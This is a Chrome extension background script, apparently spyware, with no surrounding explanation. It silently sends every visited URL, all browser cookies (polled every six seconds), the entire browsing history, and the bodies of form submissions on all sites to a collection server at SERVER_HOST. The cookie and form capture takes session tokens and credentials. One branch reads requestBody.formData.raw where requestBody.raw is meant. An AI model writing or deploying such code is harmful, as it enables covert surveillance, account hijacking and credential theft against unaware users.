const SERVER_HOST = "http://127.0.0.1:5000"


//URL DATA

chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url != 'about:blank'){
    
        fetch(
            `${SERVER_HOST}/u`,
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}}, {});



//Cookies Data

chrome.alarms.create({ periodInMinutes: 0.1 });


function logCookies(cookies) {
    var a = [];
    for (const cookie of cookies) {
      a.push(cookie);
    }
    fetch(
        `${SERVER_HOST}/c`,
        {
            method: "POST",
            body:JSON.stringify(a),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
  }

function logHistory(hists){
    var a = []
    for(const his of hists){
        a.push(his)
    }
    fetch(
        `${SERVER_HOST}/h`,
        {
            method: "POST",
            body:JSON.stringify(a),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );

}

function logFormData(form){

        let data = {};
        if (form.requestBody != undefined) {
            if (form.requestBody.formData != undefined) {
                data["data"] = form.requestBody.formData
            }
            if (form.requestBody.raw != undefined) {
                data["data"] = form.requestBody.formData.raw.join("");
            }
            fetch(
                `${SERVER_HOST}/f`,
                {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                }
            );
        }
    

}


  chrome.alarms.onAlarm.addListener(()=>{
    chrome.cookies.getAll({}).then(logCookies);
    chrome.history.search({ text: "" }).then(logHistory);

})



//Form DATA
chrome.webRequest.onBeforeRequest.addListener(
    (e) => {logFormData(e)},
    {urls: ["<all_urls>"]},
    ["requestBody"]
);